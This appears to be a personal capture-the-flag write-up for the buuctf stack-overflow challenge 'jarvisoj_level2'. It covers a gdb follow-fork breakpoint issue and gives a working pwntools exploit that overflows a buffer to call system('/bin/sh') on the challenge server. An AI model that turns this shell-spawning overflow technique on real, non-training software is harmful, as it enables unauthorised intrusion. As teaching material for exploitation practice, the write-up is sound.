# Stack overflow

## 1. jarvisoj_level2

From: buuctf

click [here](../PwnFile/level2) to download.

We can easily find the **binsh_addr** and **system_call_address**.

It's an easy problem, but there's something new while using **gdb** to find the offset from buffer to *ebp*.

> When you try to set breakpoint, you may get the error like this:
>
> [Attaching after Thread 0xf7fc2400 (LWP 10853) vfork to child process 10856]
> 
> [New inferior 2 (process 10856)]
> 
> [Thread debugging using libthread_db enabled]
> 
> Using host libthread_db library "/usr/lib/libthread_db.so.1".
> 
> [Detaching vfork parent process 10853 after child exec]
> 
> [Inferior 1 (process 10853) detached]
> 
> process 10856 is executing new program: /usr/bin/bash
> 
> Warning:
>
> Cannot insert breakpoint 2.
>
> Cannot access memory at address 0x8048475

You need to use **set follow-fork-mode parent** command to continue. 

There's nothing new about this.

Exp:
```python
from pwn import *

# sh = process('./level2')
sh = remote('node4.buuoj.cn', 25873)

binsh_addr = 0x804a024
target = 0x804849e
offset = 0xffffcb78 - 0xffffcaf0 + 4

payload = flat([cyclic(offset), target, binsh_addr])
sh.sendlineafter(b'Input:', payload)
sh.interactive()
```

## 2. 
